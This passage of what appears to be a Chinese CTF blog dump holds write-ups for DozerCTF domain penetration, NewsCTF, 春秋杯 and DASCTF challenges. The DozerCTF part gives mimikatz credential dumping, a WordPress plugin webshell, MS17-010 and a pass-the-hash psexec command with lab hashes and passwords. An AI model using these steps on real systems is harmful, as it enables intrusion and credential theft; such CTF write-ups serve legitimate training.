K rdpclip.exe 2692 RDP-Tcp#0 2 6,404 K msiexec.exe 5100 Services 0 4,772 K explorer.exe 3296 RDP-Tcp#0 2 81,692 K ServerManager.exe 1176 RDP-Tcp#0 2 113,916 K WmiPrvSE.exe 1384 Services 0 10,948 K Taskmgr.exe 4444 RDP-Tcp#0 2 37,920 K vm3dservice.exe 2204 RDP-Tcp#0 2 3,516 K cmd.exe 3556 Services 0 2,084 K conhost.exe 4992 Services 0 2,908 K tasklist.exe 1196 Services 0 5,500 K avp.exe &lt;=&gt; Kaspersky 卡巴斯基 看下网络连接，有 3389，应该是远程桌面。 这里复现的时候还发现没开远程桌面，然后又按照 0x02 中的方法先打开…… # netstat -ano 活动连接 协议 本地地址 外部地址 状态 PID TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 796 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:1433 0.0.0.0:0 LISTENING 1304 TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING 1388 TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:49152 0.0.0.0:0 LISTENING 524 TCP 0.0.0.0:49153 0.0.0.0:0 LISTENING 872 TCP 0.0.0.0:49154 0.0.0.0:0 LISTENING 928 TCP 0.0.0.0:49155 0.0.0.0:0 LISTENING 636 TCP 0.0.0.0:49177 0.0.0.0:0 LISTENING 620 TCP 0.0.0.0:49182 0.0.0.0:0 LISTENING 636 TCP 0.0.0.0:49238 0.0.0.0:0 LISTENING 1304 TCP 10.10.1.231:139 0.0.0.0:0 LISTENING 4 TCP 10.10.1.231:1433 10.10.1.234:49404 ESTABLISHED 1304 TCP 10.10.1.231:1433 10.10.1.234:49410 ESTABLISHED 1304 TCP 10.10.1.231:1433 10.10.1.234:49411 ESTABLISHED 1304 TCP 10.10.1.231:1433 10.10.1.234:49412 ESTABLISHED 1304 TCP 10.10.1.231:1433 10.10.1.234:49413 ESTABLISHED 1304 TCP 10.10.1.231:1433 10.10.1.234:49414 ESTABLISHED 1304 TCP 10.10.1.231:1433 10.10.1.234:49417 ESTABLISHED 1304 TCP 127.0.0.1:49192 127.0.0.1:49193 ESTABLISHED 1604 TCP 127.0.0.1:49193 127.0.0.1:49192 ESTABLISHED 1604 TCP 127.0.0.1:49194 0.0.0.0:0 LISTENING 1604 TCP 127.0.0.1:49195 127.0.0.1:49196 ESTABLISHED 1604 TCP 127.0.0.1:49196 127.0.0.1:49195 ESTABLISHED 1604 TCP 127.0.0.1:49220 127.0.0.1:49221 ESTABLISHED 3744 TCP 127.0.0.1:49221 127.0.0.1:49220 ESTABLISHED 3744 TCP 127.0.0.1:49226 127.0.0.1:49227 ESTABLISHED 1604 TCP 127.0.0.1:49227 127.0.0.1:49226 ESTABLISHED 1604 TCP [::]:80 [::]:0 LISTENING 4 TCP [::]:135 [::]:0 LISTENING 796 TCP [::]:445 [::]:0 LISTENING 4 TCP [::]:1433 [::]:0 LISTENING 1304 TCP [::]:3389 [::]:0 LISTENING 1388 TCP [::]:5985 [::]:0 LISTENING 4 TCP [::]:47001 [::]:0 LISTENING 4 TCP [::]:49152 [::]:0 LISTENING 524 TCP [::]:49153 [::]:0 LISTENING 872 TCP [::]:49154 [::]:0 LISTENING 928 TCP [::]:49155 [::]:0 LISTENING 636 TCP [::]:49177 [::]:0 LISTENING 620 TCP [::]:49182 [::]:0 LISTENING 636 TCP [::]:49238 [::]:0 LISTENING 1304 UDP 0.0.0.0:123 *:* 1000 UDP 0.0.0.0:500 *:* 928 UDP 0.0.0.0:3389 *:* 1388 UDP 0.0.0.0:4500 *:* 928 UDP 0.0.0.0:5355 *:* 520 UDP 0.0.0.0:64354 *:* 520 UDP 10.10.1.231:137 *:* 4 UDP 10.10.1.231:138 *:* 4 UDP 127.0.0.1:50457 *:* 2964 UDP 127.0.0.1:53687 *:* 2964 UDP 127.0.0.1:56295 *:* 928 UDP 127.0.0.1:59110 *:* 2964 UDP 127.0.0.1:61057 *:* 520 UDP 127.0.0.1:61059 *:* 636 UDP 127.0.0.1:61187 *:* 2964 UDP [::]:123 *:* 1000 UDP [::]:500 *:* 928 UDP [::]:3389 *:* 1388 UDP [::]:4500 *:* 928 UDP [::]:5355 *:* 520 UDP [::]:64354 *:* 520 为了方便，先加个用户，然后 rdp 上去看看。 net user /add root test456123! net localgroup administrators root /add 尝试创建 lsass.exe 的转储文件，然而刚点就被掐掉了。 （此处好想把卡巴斯基退出 根据官方题解的话，这里的 DozerOCS.exe 是 Alice 用户（也就是下文中 wordpress 的用户）起的，应该是 dump 这个的 然而咱复现的时候 tasklist 里没这个玩意啊……（应该是被之前进来的师傅们日坏了 Orz 后来环境又重置了一次，这回有了，上面说的 tasklist 已经改成新的了。 创建转储文件。 这里直接借助 234 机器上的木马，把 dmp 传到 234 机器上，本地再拖回来。 这里上传的时候发现直接上传会报错，压缩之后就没事了。 其实更好的方案比如用 powershell 起个 web 服务，或者把文件通过命令行 post 到其他机器上，再或者用 net use 拖回来？ strings DozerOCS.DMP | grep ldap 得到 Alice 的用户信息。 ldap://dc01.dozer.org:389|CN=AliceAlc,CN=Users,DC=dozer,DC=org|FkuWvj08 密码 FkuWvj08 另外，由于没做免杀，这台机器上 msf 木马被杀了（（之后有机会再研究研究免杀吧 0x04 10.10.1.121 DESKTOP-ALICE盲猜用户名 Alice，利用上面得到的密码登录 DESKTOP-ALICE。 这台也在域里。 桌面上得到 flag。 同样，上线 msf 看了一下这台上面也没有域管的 hash。 0x05 10.10.1.250 WordPress管理员用户名为 alice 看看 121 机器中 Chrome 的 Cookie： C:\\Users\\ALICE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies 整个 mimikatz 获取一下 Cookie。 dpapi::chrome /in:\"C:\\Users\\ALICE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\" /unprotect 然而发现复现的时候环境被破坏掉了……（喵呜！ 顺便也在上面看到了之前师傅进来用 hack-browser-data.exe 导出的浏览器数据，然而也没用来登录的 cookie 了…… 另外还发现了用户名和密码。 UserName,Password,LoginUrl,CreateDate Alice,Alice@Dozer@2021,http://10.10.1.250,2021-05-27T22:57:09+08:00 登录进来了。 版本号 WordPress 5.2 插件管理器里加个一句话木马。 http://10.10.1.250/wp-content/plugins/hello.php flag 在 wordpress 用户桌面。 顺便上线 msf。 0x06 10.10.1.1 DC在 250 机器上把内存中的登录信息 dump 出来。 或者上去用 mimikatz 执行，再或者把 lsass.exe dump 下来拖回本地再提取也行。 # 直接在机器上抓取 mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords full\" exit # 拉回本地处理 mimikatz.exe \"sekurlsa::minidump lsass.dmp\" sekurlsa::logonpasswords Authentication Id : 0 ; 27358144 (00000000:01a173c0) Session : Interactive from 4 User Name : DWM-4 Domain : Window Manager Logon Server : (null) Logon Time : 2021/5/31 14:34:20 SID : S-1-5-90-4 msv : [00000003] Primary * Username : WEB02$ * Domain : DOZER * NTLM : b943c070d6b172a110ac4a7a02cb0995 * SHA1 : 5974013dfc3df4584e32d923dcb67a36236926ee tspkg : wdigest : * Username : WEB02$ * Domain : DOZER * Password : 0]nCM-wq:#yu`.nHaH Kb^ Y4ehToFRWBT &amp;ZJVXNAhGHQI)QXAM4K-8_FY=sJ*DGwmoevtkPt60YT.EA%&lt;h&amp;!SQS]\"1`4Ruf6rrgi_J%1wy!0:%f*#b%@)U kerberos : * Username : WEB02$ * Domain : dozer.org * Password : 0]nCM-wq:#yu`.nHaH Kb^ Y4ehToFRWBT &amp;ZJVXNAhGHQI)QXAM4K-8_FY=sJ*DGwmoevtkPt60YT.EA%&lt;h&amp;!SQS]\"1`4Ruf6rrgi_J%1wy!0:%f*#b%@)U ssp : credman : Authentication Id : 0 ; 528906 (00000000:0008120a) Session : Interactive from 3 User Name : wordpress Domain : WEB02 Logon Server : WEB02 Logon Time : 2021/5/30 3:23:02 SID : S-1-5-21-304103692-1934564980-1899848695-1001 msv : [00000003] Primary * Username : wordpress * Domain : WEB02 * NTLM : b86fad0edf04a96244ec22959ce47d1d * SHA1 : f11df01e661b9f3da0736a850b82d6d5c3b65529 [00010000] CredentialKeys * NTLM : 85e6f9a1053b80f86820e4deaa351968 * SHA1 : f37f6af8dc2cfd74a967181db0376dc5d1197fb1 [00010000] CredentialKeys * NTLM : b86fad0edf04a96244ec22959ce47d1d * SHA1 : f11df01e661b9f3da0736a850b82d6d5c3b65529 tspkg : wdigest : * Username : wordpress * Domain : WEB02 * Password : Dozer@p4ssw0rd kerberos : * Username : wordpress * Domain : WEB02 * Password : (null) ssp : credman : DOZER\\WEB02$ 用户说不定有戏，密码和 NTLM 都有了。 然而发现利用它并不能登上域控 10.10.1.1 啊！ 看了看 Administrators 用户组，应该域管是这个才对吧，然而内存里也没有域管的 hash 啊…… 怕是环境已经被之前进来的师傅们搅乱了。（摊手 么得办法，又考虑到大师傅说域控就有 MS17-010 这个洞，这里就试着打一打吧。虽然说是这样非预期解…… 在之前的机器传了个 fscan 上去再扫一波内网，顺便用管理员身份扫一波 ms17010. 好家伙，他域控果然有洞啊！ （这里复现的时候发现又打不通了，直接略去不写了吧 然后利用 impacket 工具中的 psexec.py，可以通过 hash 来连接远程执行命令。 可以参考 Impacket 网络协议工具包介绍 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9912e73b8ee265638b43d105fdb4c6f4 dozer/Administrator@10.10.1.1 乱码的话先指定一下编码 chcp 65001，使用 UTF-8 编码。 在桌面上拿到 flag。 mimikatz 抓取密码。 mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords full\" exit 得到 Administrator 明文密码 Admin890... 同时也发现了个 flag 用户。 0x07 10.10.1.100 Exchange利用DOZER\\WEB02$ 用户信息通过 ADExplorer64 连接到域控 10.10.1.1，可以查看一下域内信息。 里面看到了个 flag 用户。 （实际上域内的用户都能连接域控，查看域内的信息……之前的 Alice 也可以。 用域管的 Administrator 登录 https://10.10.1.100/owa/ 里面有个草稿提示了 flag 需要在 Dozerflagflag（也就是 flag@dozer.org ）用户里找。和上面的发现相照应了。 按照官方 writeup 里的说法，首先利用域管 Administrator 登录 Exchange 管理中心，即 https://10.10.1.100/ecp/ 然后给 flag 用户设置邮箱委托，把 Administrator 用户加进去。 然后访问 https://10.10.1.100/owa/flag@dozer.org/ 即可查看 flag 用户的邮件，从而拿到 flag。 0x08 小结第一次打域渗透的题目，好爽啊！ 感谢主办方搭建的域环境，让喵喵有机会好好玩了一波！ 明年有机会再来玩 qwq！ （溜了溜了喵","path":"2021/06/20/Pentest_2021DozerCTF/"},{"title":"CTF | 2021 NewsCTF 6.1萌新赛 WriteUp","text":"引言 NEWSCTF 2021.6.1萌新赛 比赛时间：2021.5.31 08:00 - 6.3 00:00 http://114.96.78.89:8000/ 唯一官方QQ群：1063624041 六一那几天有个小比赛，不过前段时间比较忙没做几个题，也没空整理。 比赛结束后本来还想复现几个题的，咕着咕着发现都忘记了，这里就把几个简单题发一发好了吧。 Miscvery-ez-dump 链接：https://pan.baidu.com/s/1mqJsQN1kfNFwV0lpGiOBpg 提取码：news （或去官方比赛群1063624041的群文件-临时题目文件夹中获取） # volatility -f mem.raw --profile Win7SP1x64 filescan | grep Desktop Volatility Foundation Volatility Framework 2.6 0x000000003dca8280 4 0 R--r-d \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop\\DumpIt.exe 0x000000003dcc8600 2 0 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\Links\\Desktop.lnk 0x000000003de778f0 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Public\\Desktop 0x000000003dfdcd20 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop 0x000000003e0e9f20 1 0 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\AppData\\Roaming\\Microsoft\\Windows\\SendTo\\Desktop.ini 0x000000003e156f20 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop\\desktop.ini 0x000000003e15aac0 2 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Public\\Desktop\\desktop.ini 0x000000003e16c250 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Desktop.ini 0x000000003e16e070 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Desktop.ini 0x000000003e16ff20 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Maintenance\\Desktop.ini 0x000000003e170f20 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Accessibility\\Desktop.ini 0x000000003e171f20 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\System Tools\\Desktop.ini 0x000000003e172d00 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Games\\Desktop.ini 0x000000003e174e20 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Maintenance\\Desktop.ini 0x000000003e175af0 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\System Tools\\Desktop.ini 0x000000003e176890 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Accessibility\\Desktop.ini 0x000000003e50cd10 16 0 RW-rw- \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop\\计算机 - 快捷方式.lnk 0x000000003f6bf330 2 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Remote Desktop Connection.lnk 0x000000003fa20e20 1 1 R--rw- \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop 0x000000003fa4b450 16 0 RW-r-- \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop\\hint.txt 0x000000003fa557f0 1 0 R--rwd \\Device\\HarddiskVolume1\\Windows\\assembly\\Desktop.ini 0x000000003fa62c60 1 0 R--rwd \\Device\\HarddiskVolume1\\Windows\\Media\\Desktop.ini 0x000000003fa63200 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop 0x000000003fa77920 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Public\\Desktop 0x000000003fabec90 1 1 RW-rw- \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop\\WIN-DLV72BHQ4GL-20210520-130833.raw 0x000000003faf9f20 6 0 R--rwd \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop\\DumpIt.exe # volatility -f mem.raw --profile Win7SP1x64 dumpfiles -Q 0x000000003fa4b450 -D . -u Volatility Foundation Volatility Framework 2.6 DataSectionObject 0x3fa4b450 None \\Device\\HarddiskVolume1\\Users\\mumuzi\\Desktop\\hint.txt 桌面上有个 hint.txt，提取出来。 内容是 you ask me where is the passwd? you can try to find the user passwd. it is so ez!!!!!! 那就查看内存，提取密码。 # volatility -f mem.raw --profile Win7SP1x64 hivelist Volatility Foundation Volatility Framework 2.6 Virtual Physical Name ------------------ ------------------ ---- 0xfffff8a001108010 0x000000001e9f0010 \\??\\C:\\Windows\\ServiceProfiles\\LocalService\\NTUSER.DAT 0xfffff8a001283010 0x000000003d0fa010 \\??\\C:\\Users\\mumuzi\\ntuser.dat 0xfffff8a00141b010 0x0000000034bea010 \\??\\C:\\Users\\mumuzi\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat 0xfffff8a0020bb010 0x000000002482d010 \\??\\C:\\System Volume Information\\Syscache.hve 0xfffff8a00000f010 0x00000000208a1010 [no name] 0xfffff8a000024010 0x00000000209ac010 \\REGISTRY\\MACHINE\\SYSTEM 0xfffff8a000053010 0x000000001fddb010 \\REGISTRY\\MACHINE\\HARDWARE 0xfffff8a0000f6010 0x000000001a98f010 \\SystemRoot\\System32\\Config\\DEFAULT 0xfffff8a0005fd010 0x0000000022eb3010 \\Device\\HarddiskVolume1\\Boot\\BCD 0xfffff8a0009f5010 0x00000000227ca010 \\SystemRoot\\System32\\Config\\SOFTWARE 0xfffff8a000f2b010 0x000000001f3c2010 \\SystemRoot\\System32\\Config\\SECURITY 0xfffff8a000fc1010 0x0000000000b5a010 \\SystemRoot\\System32\\Config\\SAM 0xfffff8a00107e010 0x00000000055cd010 \\??\\C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT # volatility -f mem.raw --profile Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000fc1010 Volatility Foundation Volatility Framework 2.6 Administrator:500:aad3b435b51404eeaad3b435b51404ee:1507e24d634a54c0b14750a7da2bdfdb::: Guest:501:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b::: mumuzi:1000:aad3b435b51404eeaad3b435b51404ee:0606ac59df4a10d3a9e1f97b3612546f::: # volatility -f mem.raw --profile Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000fc1010 &gt; pass.txt Volatility Foundation Volatility Framework 2.6 # john pass.txt --format=NT Using default input encoding: UTF-8 Loaded 3 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3]) Warning: no OpenMP support for this hash type, consider --fork=2 Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Warning: Only 11 candidates buffered for the current salt, minimum 24 needed for performance. Warning: Only 23 candidates buffered for the current salt, minimum 24 needed for performance. Almost done: Processing the remaining buffered candidate passwords, if any. Warning: Only 12 candidates buffered for the current salt, minimum 24 needed for performance. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist 123456789 (Guest) Proceeding with incremental:ASCII ... 貌似没啥用…… 看看命令行记录。 # volatility -f mem.raw --profile Win7SP1x64 cmdscan Volatility Foundation Volatility Framework 2.6 ************************************************** CommandProcess: conhost.exe Pid: 1588 CommandHistory: 0x117120 Application: cmd.exe Flags: Allocated, Reset CommandCount: 13 LastAdded: 12 LastDisplayed: 12 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x60 Cmd #0 @ 0x109cf0: dir Cmd #1 @ 0x108290: ipconfig Cmd #2 @ 0xf8bd0: ipconfig 192.168.26.2 Cmd #3 @ 0x116aa0: ping newsctf.top Cmd #4 @ 0x1082d0: network Cmd #5 @ 0x1082f0: net user Cmd #6 @ 0xf8c50: net user Guest 123456789 Cmd #7 @ 0xf8c90: net user mumuzi (ljmmz)ovo Cmd #8 @ 0x108350: clear Cmd #9 @ 0x116a40: if_you_see_it, Cmd #10 @ 0xf8cd0: you_will_find_the_flag Cmd #11 @ 0x116ad0: where_is_the_flag? Cmd #12 @ 0x1178d0: net user Administrator flag_not_here Cmd #29 @ 0x90158: Cmd #30 @ 0x10f920: ************************************************** CommandProcess: conhost.exe Pid: 2824 CommandHistory: 0x357140 Application: DumpIt.exe Flags: Allocated CommandCount: 0 LastAdded: -1 LastDisplayed: -1 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x60 Cmd #29 @ 0x2d0158: 5 Cmd #30 @ 0x34f940: 4 当成 flag 交上去都不对。不信了。 再去搜一波文件。 # volatility -f mem.raw --profile Win7SP1x64 filescan |grep \"flag\" Volatility Foundation Volatility Framework 2.6 0x000000003e4b2070 2 0 -W-rwd \\Device\\HarddiskVolume1\\galf\\fl^ag.zipesktop\\fl^ag.zipp\\vmware-mumuzi\\VMwareDnD\\9451fe4f\\flag.zip 0x000000003fa56dd0 2 0 RW-rw- \\Device\\HarddiskVolume1\\Users\\mumuzi\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\flag.lnk # volatility -f mem.raw --profile Win7SP1x64 dumpfiles -Q 0x000000003e4b2070 -D . -u Volatility Foundation Volatility Framework 2.6 DataSectionObject 0x3e4b2070 None \\Device\\HarddiskVolume1\\galf\\fl^ag.zipesktop\\fl^ag.zipp\\vmware-mumuzi\\VMwareDnD\\9451fe4f\\flag.zip 用 (ljmmz)ovo 作为密码解压，得到 flag。 flag{ez_di_imp_1t_y0u_like?} Crypto签到 Webeasy_web 签到题 题目地址：http://47.106.172.29:22221/ hint:这个图片真好看呀，没啥隐藏的东西吧 再也不信你们什么签到题了！！！ 先把背景图下载下来吧。 提取出来个 zip 好家伙，看来网页上又有假的 flag。原来是 Misc + Web 啊。 网页上给了源码。 &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=UTF-8\"&gt; &lt;title&gt;EasyWeb&lt;/title&gt; &lt;style&gt; html, body { margin: 0; padding: 0; width: 100%; height: 100%; text-align: center; } body { background-image: url(backImg.jpg); background-size: contain; } .content { width: 80%; text-align: left; padding : 10px; margin: 0 auto; background-color: rgb(255, 255, 255, 0.7); } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;EasyWeb&lt;/h1&gt; &lt;div class=\"content\"&gt; &lt;?php highlight_file(\"index.php\") ?&gt; &lt;/div&gt; &lt;div class=\"content\"&gt; &lt;?php $six_number = $_POST['webp']; $a = $_POST['a']; $b = $_POST['b']; $c = $_POST['c']; if (md5($six_number) == 'e10adc3949ba59abbe56e057f20f883e' &amp;&amp; md5($a) === md5($b) &amp;&amp; $a !== $b) { if($array[++$c]=1){ if($array[]=1){ echo \"nonono\"; } else{ require_once 'flag.php'; echo $flag; } } } ?&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; md5 e10adc3949ba59abbe56e057f20f883e 对应的明文是 123456，md5 相同而内容不同的话可以用数组绕过，即 a[]=1&amp;b[]=2. 然而这个 if($array[]=1) 怎么绕过，咱两天里断断续续想着也没想出来…… 最后比赛结束了才知道是数组 Key 整数溢出。 在 php 中一个 array 包含键 key 和值 value，当给一个未指定 key 的 array 赋值时，会自动给当前 key 赋值为上一个使用过的 整数 key +1（一个整数），如果没有使用过的话则为 0. 假如之前的 key 是个字符或字符串，那新的下标也就是 0. 另外 php 的 ++ 除了会给整数 +1 外，还可以给字符 +1，倒是字符的 ++ 有亿点怪，比如 z-&gt; aa, Z -&gt; AA, 1Z -&gt; 2A, Zaf -&gt; Zag, 3adAZ -&gt; 3adBA, etc. 这里就不研究了，也不是这题关键（喵喵懵了，感觉得看底层源码才知道 而这里的最大表示数是 2**63-1，即 9223372036854775807，然后因为 if($array[++$c]=1) 做了自增处理，咱把 c 设为 9223372036854775806，当 if($array[]=1) 赋值的时候就会造成溢出，报错且判断不为真，从而能够拿到 $flag. （感觉说的好乱啊，随意看看就好了 于是 Payload： webp=123456&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806 你看他这里报的错就是 由于下一个元素被占用而不能将其添加到 array 中。 password: xluoyyds123456@@@ 拿去解压得到最终的 flag。 newsctf{this_1s_veryveryveryeasyweb} 去搜了一下 stackoverflow: “next element is already occupied” error 其实这题的 c 就是赋值为 PHP_INT_MAX -1. 相当于在 PHP 里一个 array 最多能够表示的元素个数就是 PHP_INT_MAX 了。 然后又发现，在去年发布的 PHP8 里，这个 抛出异常变成 Error 了！ （安全性提升++ 小结其他有的题目还是有点意思的。 就先这样吧（摊手睡大觉 （溜了溜了喵","path":"2021/06/18/CTF_2021NewsCTF0601/"},{"title":"CTF | 2021 春秋杯 Baby_steg WriteUp","text":"引言 2021年 春秋杯 网络安全联赛春季赛 比赛时间：2021年5月29日 10:00-18:00 https://www.ichunqiu.com/chunqiucup 和上一篇一样，这周末比赛巨多。 于是春秋杯的话也是随意看了题，然而发现题目挺难的 Orz。 这个比赛的时候就摸鱼做了 Misc Baby_steg 题目的一半，剩下一半还是比赛后复现的。其他题目就没怎么看吧。 这题结合了几个之前没见过的玩法，这里顺手记录一下。 Baby_steg 小A想学MISC，她请教了某大佬，大佬为了考验她的能力，给了她一个文件，让她找到其中隐藏的秘密，可是小A拿到文件后一脸懵逼，所以来找你求救，你能帮助她吗? 附件下载 提取码（GAME）备用下载 hint:先获取password.7z里面的内容，大佬好像跟小A说是6-8位的数字 下载下来个压缩包。 根据提示需要先解密那个 7z。 搜了一下发现 cRARk for 7-Zip 用来爆破还挺不错，支持自定义各种格式的密码，还能调用 GPU 加速运算。 在 https://www.crark.net/crark-7zip.html 这里下载。 参考 https://www.crark.net/cRARk-7z.html 写 password.def 定义文件。 由于全是数字，直接就写成这样。 ## $1 * 然后指定最小和最大的长度去解密。 crark-7z.exe -l6 -g8 password.7z 得到 7z 的密码 321456 解压出来个 password.txt 7324623c flag1.txt 这是什么玩意…… 后来看了别人 wp 才发现是 uuencode。来复现一下。 拿 python 写个脚本解码一下。 import uu s = uu.decode('flag1.txt') 它会自动输出文件。 加密的话就是 uu.encode(input_file, output_file) 用上面解密得到的 7324623c 作为密码解压。 得到一张图 challenge.png 以及 encode.py import numpy as np import cv2 import sys import random def encode(image): i = random.randint(520,540) np.random.seed(i) # image = 1298 * 695 to_hide = cv2.imread(image) to_hide_array = np.asarray(to_hide) for i in range(to_hide_array.shape[0]): np.random.shuffle(to_hide_array[i]) gray = cv2.cvtColor(to_hide_array, cv2.COLOR_BGR2GRAY) cv2.imwrite('challenge.png', gray) print(\"encode!\") def main(): if len(sys.argv) != 2: print('error!') exit(1) encode(sys.argv[1]) if __name__ == '__main__': main() 随机数种子在 520-540 之前取值，np.random.shuffle 函数把 to_hide_array 第1个维度上的数字进行位置上的随机打乱。 于是可以试试爆破这个随机数种子，记录下打乱前后下标的映射关系，再反过来恢复出原始图像，其中一个就是打乱之前的图像了。 另外注意 random.randint(520,540) 在 520 和 540 上都能取到值，即左右区间都闭合。 代码写的有点乱，能用就行了。（逃走 import numpy as np import cv2 import sys import random def decode(image): # image = 1298 * 695 to_hide = cv2.imread(image) to_hide_array = np.asarray(to_hide) shape = to_hide_array.shape for i in range(520, 541): print('====&gt;', i) np.random.seed(i) l1 = [] for j in range(shape[0]): l2 = list(range(shape[1])) new_array = [] np.random.shuffle(l2) for x in range(len(l2)): new_array.append(to_hide_array[j][l2.index(x)]) l1.append(new_array) l1_array = np.asarray(l1) # gray = cv2.cvtColor(l1_array, cv2.COLOR_BGR2GRAY) cv2.imwrite(f'decode{i}.png', l1_array) def main(): decode('challenge.png') if __name__ == '__main__': main() 最后跑出来是随机种子为 540 时候的情况，得出 flag。 小结Baby_steg 这题还是堆了几个没玩过的知识点的，正好还把 7z 压缩包爆破的工具也找了一波，cRARk for 7-Zip 还是挺香的！ 顺便还发现了 python 里的 uu 就能直接进行 uuencode 编解码，好耶。 就这样吧，摸🐟大法好！ BTW，XCTF final 的题目太顶了，喵喵好菜玩不来，喵呜呜呜。 （看啥时候有机会再摸鱼来复现吧，喵喵🐱 （溜了溜了喵","path":"2021/05/31/CTF_2021chunqiu_Baby_steg/"},{"title":"CTF | 2021 DASCTF May WriteUp","text":"引言 DASCTF May 2021年5月29日 10:00-18:00 https://buuoj.cn/ 这周末好啊，特别是5月29日真是个好日子，一堆比赛全堆在这天了…… 比如 DASCTF May、春秋杯、XCTF final、DozerCTF，balabala。 几个比赛题目大概看了看，DASCTF May 这次比较基础（赵总貌似也说是为了测试 buuoj 的 matches 新模块），这里就随意写写当作做题记录好了。 MiscHolmes Do you know Holmes? 文件结尾一个 rar 压缩包 图片上是个跳舞的小人密码，参考下图。 得到密码为 YOYAREHOLMES，然而并不对，根据意思应该是 YOUAREHOLMES 解压得到 flag.py flag=\"flag{********************************}\" encflag=[] for i in range(len(flag)): encflag.append((ord(flag[i])+i)%128) print(encflag) ''' [102, 109, 99, 106, 127, 57, 60, 104, 60, 107, 61, 62, 65, 68, 115, 64, 67, 119, 66, 74, 73, 74, 119, 75, 74, 79, 79, 76, 78, 82, 78, 85, 83, 84, 82, 86, 92, 34] ''' 逆着写脚本解密就好。 l = [102, 109, 99, 106, 127, 57, 60, 104, 60, 107, 61, 62, 65, 68, 115, 64, 67, 119, 66, 74, 73, 74, 119, 75, 74, 79, 79, 76, 78, 82, 78, 85, 83, 84, 82, 86, 92, 34] flag = '' for k, v in enumerate(l): try: s = chr(v-k) except: s = chr(v-k+128) flag += s print(s, flag) print(flag) flag{46a4b3357e13f0755a42651250633038} rickroll_u we will rickroll you!（flag内容为字母数字组合，请MD5后提交。） 链接: https://pan.baidu.com/s/1JJ8AtqFJVFa6u9z7RKunPw 密码: nwld 压缩包明文解密，先把 ah_old_time.txt 以不压缩的方式弄成一个压缩包。 跑出来密码是 t!m32R1。 解压出来有个音频文件 rickroll_u.wav 好家伙，是那个理查德·艾斯利的 Never Gonna Give You Up，太经典啦。 文件结尾还有个 wav，手动提取出来。 发现是个 DTMF. 提取出来是 0916A639。发现 md5 提交上去不对。 最后发现字母是小写。。。0916a639 md5 =&gt; c8c15a11dd2852cbe63df405debc9d41 直接交上去就行。 DCT domain steganography &amp; crack hint1链接: https://pan.baidu.com/s/1obhR1KqUv2VCuyC0Qy62AQ 密码: t86j 这里有个 top 1000 密码 开局一张图…… DCT 域隐写的有好几个工具来着，给了个 top1000 密码应该就是用来解密的密钥了。 （感觉没意思，没往后做了，后来群里说是 outguess sseddoG下载下来是个流量包，提取出来有个Athena.png 结尾拼接了个 xml，里面有公钥和私钥。 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;ATHENA&gt; &lt;TASKING&gt; 